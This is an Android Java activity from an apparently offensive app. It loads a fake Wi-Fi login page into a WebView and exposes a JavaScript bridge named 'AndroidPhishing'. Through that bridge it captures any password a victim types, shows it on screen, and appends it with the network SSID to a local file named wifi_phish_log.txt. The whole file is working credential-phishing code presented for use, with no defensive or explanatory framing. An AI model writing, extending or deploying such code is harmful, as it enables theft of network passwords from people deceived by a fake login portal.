package com.sohaibazmi.remote;

import android.annotation.SuppressLint;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.FileOutputStream;

public class BruteForceActivity extends AppCompatActivity {

    private WebView phishingWebView;
    private String ssid;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_brute_force);

        phishingWebView = findViewById(R.id.phishingWebView);
        phishingWebView.getSettings().setJavaScriptEnabled(true);
        phishingWebView.addJavascriptInterface(new JSInterface(), "AndroidPhishing");
        phishingWebView.setWebViewClient(new WebViewClient());

        phishingWebView.loadUrl("file:///android_asset/fake_wifi_login.html");

        ssid = getIntent().getStringExtra("ssid");
    }

    public class JSInterface {
        @JavascriptInterface
        public void capturePassword(String password) {
            runOnUiThread(() -> Toast.makeText(BruteForceActivity.this, "Captured: " + password, Toast.LENGTH_LONG).show());
            savePassword(password);
        }

        private void savePassword(String password) {
            try {
                String log = "SSID: " + ssid + " → Password: " + password + "\n";
                FileOutputStream fos = openFileOutput("wifi_phish_log.txt", MODE_APPEND);
                fos.write(log.getBytes());
                fos.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
